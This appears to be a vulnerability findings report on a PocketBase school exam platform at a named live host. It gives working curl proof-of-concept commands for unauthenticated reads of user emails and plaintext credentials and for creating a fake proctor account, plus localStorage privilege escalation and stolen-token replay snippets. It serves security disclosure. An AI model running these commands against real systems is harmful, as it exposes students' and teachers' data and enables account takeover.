Critical Findings
Critical CRIT-01
Unauthenticated Mass Data Read — 6,505+ Records Exposed
All PocketBase collections lack API rules. Zero authentication required to enumerate any record.
Proof of Concept
curl -s "https://pb.app.web.id/api/collections/DataUsers/records?perPage=200"
→ 200 OK | 1,816 records | emails, school codes — NO AUTH curl -s "https://pb.app.web.id/api/collections/DataUjian/records?perPage=1" → 200 OK | totalItems: 4,675 | teacher emails + exam metadata — NO AUTH curl -s "https://pb.app.web.id/api/collections/DataPengawas/records?perPage=50" → 200 OK | plaintext credentials in response body — NO AUTH
Critical CRIT-02
Unauthenticated Write — Fake Proctor Account Created
POST to DataUsers and DataPengawas succeeds without any token. Attacker can inject fake proctors or users.
Proof of Concept — Record Created (artifact left, DELETE requires superuser)
curl -X POST "https://pb.app.web.id/api/collections/DataPengawas/records" \ -H "Content-Type: application/json" \ -d '{"nama":"XCTest Admin","username":"xctest","password":"xctest123","key":":xctest"}'
→ 201 Created { "id": "442l8533ila002m", "collectionName": "DataPengawas", "nama": "XCTest Admin", "username": "xctest", "password": "xctest123" ← stored in plaintext }
Artifact not deleted — superuser required DataUsers record also left: id=0ywg3wdo9269qva

Plaintext Password Storage — DataPengawas

High Findings
High HIGH-01
PocketBase Admin Panel Accessible — /_/ Returns 200 OK
The PocketBase superadmin GUI is publicly reachable. Auth endpoint is also open for brute force with no lockout observed.
Endpoint
https://pb.app.web.id/_/ → HTTP 200 OK (Admin GUI) POST https://pb.app.web.id/api/collections/_superusers/auth-with-password → no lockout
High HIGH-02
Client-Side Role Control via localStorage
Role enforcement happens in the browser. Setting localStorage.userType = "admin" may escalate privileges.
// From core-C3bGrs1O.js (decompiled) const userType = localStorage.getItem("userType") // "admin" | "guru" | "pengawas" | "siswa" if (userType === "admin") { /* unlock admin routes */ } // Exploit: DevTools console localStorage.setItem("userType", "admin"); location.reload();
High HIGH-03
JWT Token Stored in localStorage — XSS → Account Takeover
PocketBase auth token stored plaintext in localStorage key "pocketbase_auth". Any XSS yields full session theft.
// Steal vector (via XSS) JSON.parse(localStorage.getItem("pocketbase_auth")) // → { token: "eyJ...", model: { id, email, ... } } // Replay stolen token curl -H "Authorization: eyJ..." https://pb.app.web.id/api/collections/DataSiswa/records
